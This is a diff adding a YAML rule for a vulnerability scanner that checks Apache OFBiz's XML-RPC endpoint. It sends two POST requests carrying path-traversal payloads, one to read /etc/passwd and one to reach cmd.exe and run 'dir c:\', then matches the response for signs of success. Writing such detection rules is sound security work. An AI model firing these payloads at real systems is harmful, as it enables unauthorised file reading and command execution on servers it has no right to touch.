@@ -1,0 +1,41 @@
+name: Apache-OFBiz-文件读取
+description: "读取etc/passwd或者执行dir命令"
+matchCount: 1
+rules:
+  - method: POST
+    path: "/webtools/control/xmlrpc"
+    body: > 
+       <?xml version="1.0"?>
+       <methodCall>
+         <methodName>example.createBlogPost</methodName>
+         <params>
+          <param>
+            <value><string>../../../../../../etc/passwd</string></value>
+          </param>
+       </params>
+       </methodCall>
+    headers:
+      Content-Type: "text/xml"    
+    expression:
+      status: 200
+      body_all:
+        - "root:"
+        - "bin:"
+  - method: POST
+    path: "/webtools/control/xmlrpc"
+    body: > 
+       <?xml version="1.0"?>
+       <methodCall>
+         <methodName>performCommand</methodName>
+         <params>
+          <param>
+            <value><string>../../../../../../windows/system32/cmd.exe?/c+dir+c:\</string></value>
+          </param>
+       </params>
+       </methodCall>
+    headers:
+      Content-Type: "text/xml"    
+    expression:
+      status: 200
+      body_all:
+        - "Program Files"
